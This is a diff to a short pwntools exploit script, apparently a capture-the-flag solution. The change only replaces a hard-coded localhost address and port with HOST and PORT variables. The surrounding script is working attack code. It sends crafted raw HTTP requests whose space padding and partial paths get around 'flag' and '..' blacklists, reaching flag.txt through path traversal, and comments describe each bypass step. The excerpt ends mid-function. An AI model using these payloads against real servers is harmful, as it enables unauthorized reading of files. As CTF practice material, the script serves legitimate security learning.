@@ -1,6 +1,7 @@
 from pwn import *
 
 context.log_level = "debug"
+HOST, PORT = "127.0.0.1", 8080
 
 
 def exploit():
@@ -9,7 +10,7 @@ def exploit():
         # =-=-=-= Initial Request =-=-=-=
         # from -> ''
         # to   -> 'GET  /./xlag.txt'
-        io = remote('127.0.0.1', 8080)
+        io = remote(HOST, PORT)
         payload = f"GET{' ' * (0x20-3) + '/./xlag.txt?password=fib'} HTTP/1.1"
         io.send(payload.encode())
         io.close()
@@ -17,7 +18,7 @@ def exploit():
         # =-=-=-= Bypass 'flag' blacklist =-=-=-=
         # from -> 'GET  /./xlag.txt'
         # to   -> 'GET  /./flag.txt'
-        io = remote('127.0.0.1', 8080)
+        io = remote(HOST, PORT)
         payload = f"GET{' ' * (0x20-3)}/./f"
         io.send(payload.encode())
         io.close()
@@ -25,7 +26,7 @@ def exploit():
         # =-=-=-= Bypass '..' blacklist =-=-=-=
         # from -> 'GET  /./flag.txt'
         # to   -> 'GET /../flag.txt'
-        io = remote('127.0.0.1', 8080)
+        io = remote(HOST, PORT)
         payload = f"GET{' ' * (0x20-4)}/."
         io.send(payload.encode())
 
